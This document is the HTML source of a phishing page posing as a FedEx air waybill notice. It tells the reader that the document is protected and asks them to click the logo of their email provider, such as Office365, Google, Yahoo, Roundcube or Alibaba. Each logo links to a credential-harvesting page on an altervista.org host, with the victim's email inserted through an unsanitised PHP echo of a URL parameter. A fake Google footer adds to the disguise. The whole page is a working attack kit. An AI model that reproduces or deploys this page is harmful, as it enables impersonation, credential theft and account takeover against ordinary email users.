<html><head><title>Fedex Global Delivery</title>
<meta content="text/html; charset=utf-8" http-equiv=Content-Type>
<meta name=GENERATOR content="MSHTML 11.00.9600.18639"></head>
<body>
<div id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3486" dir="ltr">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3488" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3490">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3492" style="height: 249px;">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3494" style="height: 249px;" valign="top" width="100%">
<p><img src="https://ci5.googleusercontent.com/proxy/o4NFoYI6KWnap7tHsUrUjlm0bXD87fDiLJfz8Jc4e1H9CIqEJ1HCD3EVBfJ9sOGkEE8pi6ZH5V9T7bSWFRbZxxyQxnp-AprhtoyIsVdmhTLnU8jJFACOEe08haB5pHULaXM7G63Z=s0-d-e1-ft#http://images.fedex.com/images/us/office/nexgen09/HomePage/logo-header-fedex.png" alt="FedEx Home" width="229" height="134" /></p>
<p>ATTENTION:<!--?php echo $_GET['email']; // output 2489 ?--></p>
<p>You are about to view Air way bill B02171. <em><strong>AirwaBill Note! </strong></em></p>
<p><em>Our Document are highly protected from unauthorized viewer. </em></p>
<p><em>Please click on the logo that signifies your email domain to view and download</em><strong><em> .</em></strong></p>
</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3496" style="height: 13px;">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3498" style="height: 13px;" align="center" valign="top" width="100%">&nbsp;</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3610" style="height: 63px;">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3612" style="height: 63px;" width="100%">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3614" style="width: 763px;" border="0" cellspacing="0" cellpadding="0" align="left">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3616">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3618">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3620" style="width: 761px;" align="left" valign="top">
<p><strong><em>If you wish to view that attached file through your email, Please lick on logo that signifies your email hosters.<br /></em></strong></p>
<p><strong><em>This process is to confirm that you are a human not a robot</em></strong></p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3634" style="height: 187px;">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3636" style="height: 187px;" align="left" valign="top" width="100%">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3638" style="width: 1528px;" border="1" cellspacing="0" cellpadding="0">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3640">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3642" style="height: 58px;">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3644" style="width: 143px; height: 58px;" valign="top">
<p><a title="View Document" href="http://icttoolssales.altervista.org/horde/horde.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3645" src="https://webmail.opentransfer.com/horde/themes/graphics/horde-power1.png" alt="Download" width="117" height="76" /></a></p>
<p>Powered by Horde</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3647" style="width: 142px; height: 58px;" valign="top">
<p><a title="Open With Google Doc" href="http://icttoolssales.altervista.org/squirel/squirel.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3672" src="https://squirrelmail.org/images/sm_logo.jpg" alt="Inline image 6" width="129" height="37" /></a></p>
<p>Powered by Squirrel Mail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3650" style="width: 95px; height: 58px;" valign="top"><a title="View Document" href="http://icttoolssales.altervista.org/webmaildark/webmaildark.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="http://icttoolssales.altervista.org/webmaildark/webmaildark.png" alt="Inline image 1" width="112" height="112" /></a>&nbsp;
<p>Powered by Webmail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3653" style="width: 113px; height: 58px;" valign="top">
<p>&nbsp;</p>
<p><a title="View Document" href="http://icttoolssales.altervista.org/roundcub/roundcubeDark.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3654" src="https://roundcube.net/images/logo.png" alt="Inline image 2" width="73" height="75" /></a></p>
<p>Powered by round cube&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3656" style="width: 99px; height: 58px;" valign="top">
<p><a title="View Document" href="http://icttoolssales.altervista.org/office365/office.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcTcLxl8_RYNzpNkf9wuPsou6G8Gcx1zOIHCk1FGWouIpHrkaWDm2w" alt="Inline image 1" width="77" height="69" /></a></p>
<p>Powered by Outlook Mail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3659" style="width: 93px; height: 58px;" valign="top">
<p><a title="Click to open AWB" href="http://icttoolssales.altervista.org/webmailwite/webmailwhite.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><span id="gmail-m_7863347401620785325goog_1620505688"></span><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3660" src="http://icttoolssales.altervista.org/webmailwite/WhiteWebmail.png" alt="logo" width="101" height="86" /><span id="gmail-m_7863347401620785325goog_1620505689"></span></a></p>
<p>Powered by Webmail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3662" style="width: 95px; height: 58px;" valign="top">
<p><a title="Open with Google Drive" href="http://icttoolssales.altervista.org/NewFolder/gma/gmala.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3482" title="Google" src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png" alt="Google" width="68" height="68" border="0" /></a></p>
<p>Powered by Google</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3665" style="width: 61px; height: 58px;" valign="top">
<p><a title="View Document" href="http://icttoolssales.altervista.org/NewFolder/yaho/ymal.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Inline image 1" width="77" height="69" /></a></p>
<p>Yahoo!</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3668" style="width: 85px; height: 58px;" valign="top">
<p><img src="blob:https%3A//s177.altervista.org/6cc727ae-7379-4698-820b-9525281f6f7e" alt="" width="92" height="55" /></p>
<p>Powered byAOL</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3671" style="width: 114px; height: 58px;" valign="top">
<p><a title="Alibaba " href="http://icttoolssales.altervista.org/ali/alibaba.php?email=<?php echo $_GET['email']; // output 2489 ?>"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_" title="Google" src="http://icttoolssales.altervista.org/ali/Alibab.png" alt="Google" width="80" height="112" border="0" /></a></p>
<p>Powered by Alibaba</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3674" style="width: 120px; height: 58px;" valign="top">&nbsp;</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3678" style="width: 104px; height: 58px;" valign="top">
<p>&nbsp;</p>
</td>
<td style="width: 25px; height: 58px;" valign="top">&nbsp;</td>
<td style="width: 134px; height: 58px;" valign="top">&nbsp;</td>
<td style="width: 96px; height: 58px;" valign="top">&nbsp;</td>
</tr>
<tr style="height: 55px;">
<td style="width: 143px; height: 55px;" valign="top">
<p>&nbsp;</p>
<p><a href="http://icttoolssales.altervista.org/outlok/hot.php?email=<?php echo $_GET['email']; // output 2489 ?>" target="_blank"><img src="blob:https%3A//s177.altervista.org/82e7e147-41c8-4100-b197-755ae13905e8" alt="http://jdelivery.rediff.com/ajaxprism/pix_1_3/lsprite.png" width="86" height="117" /></a></p>
<p>Powered by Outlook/Hotmail</p>
</td>
<td style="width: 142px; height: 55px;" valign="top"><br />
<p><img src="blob:https%3A//s177.altervista.org/718c4b88-2b83-4cd7-b684-244a1cfd22a9" alt="Chinese Mail" width="143" height="107" /></p>
<p><a href="http://126.COM" target="_blank">126.COM</a>,</p>
<p><a href="http://163.COM" target="_blank">163.COM</a>,</p>
<p><a href="http://QQ.COM" target="_blank">QQ.COM</a></p>
</td>
<td style="width: 95px; height: 55px;" valign="top">
<p><a href="http://icttoolssales.altervista.org/enerprwebmail/webmail.php?email=<?php echo $_GET['email']; // output 2489 ?>"><img src="https://webmail.logix.in/images/img-left.jpg" alt="http://jdelivery.rediff.com/ajaxprism/pix_1_3/lsprite.png" width="74" height="100" /></a></p>
<p id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3676">Powered by Enerprwebmail</p>
</td>
<td style="width: 113px; height: 55px;" valign="top">
<p>&nbsp;</p>
<p><img src="blob:https%3A//s177.altervista.org/b0889453-696d-456d-9eae-9b8168a758e3" alt="Zimbra" width="86" height="84" /></p>
<p>Zimbra Mail</p>
</td>
<td style="width: 99px; height: 55px;" valign="top">&nbsp;<img src="blob:https%3A//s177.altervista.org/8480f427-4832-4532-8312-4b7bade99ff6" alt="Rediff Mail" width="97" height="97" />Rediff Mail</td>
<td style="width: 93px; height: 55px;" valign="top">&nbsp;<img src="blob:https%3A//s177.altervista.org/1a3a4aaa-78d8-4648-98a7-d7b3c2fbc1d2" alt="Mail.com" width="109" height="109" /></td>
<td style="width: 95px; height: 55px;" valign="top">&nbsp;<img src="blob:https%3A//s177.altervista.org/86b5fc48-514b-482f-ba3d-338d6815fd2a" alt="Facebook" width="127" height="48" /></td>
<td style="width: 61px; height: 55px;" valign="top">&nbsp;<img src="blob:https%3A//s177.altervista.org/b92b1173-258a-4d32-9206-52505e4a300e" alt="Linkedin" width="105" height="64" /></td>
<td style="width: 85px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 114px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 120px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 104px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 25px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 134px; height: 55px;" valign="top">&nbsp;</td>
<td style="width: 96px; height: 55px;" valign="top">&nbsp;</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<span id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3682">&copy; 2013 Google Inc. 1600 Amphitheatre Parkway, Mountain View, CA 94043</span> <br id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3686" />You have received this mandatory email service announcement to update you about important changes to your Google Apps product or account.</div>
</body></html>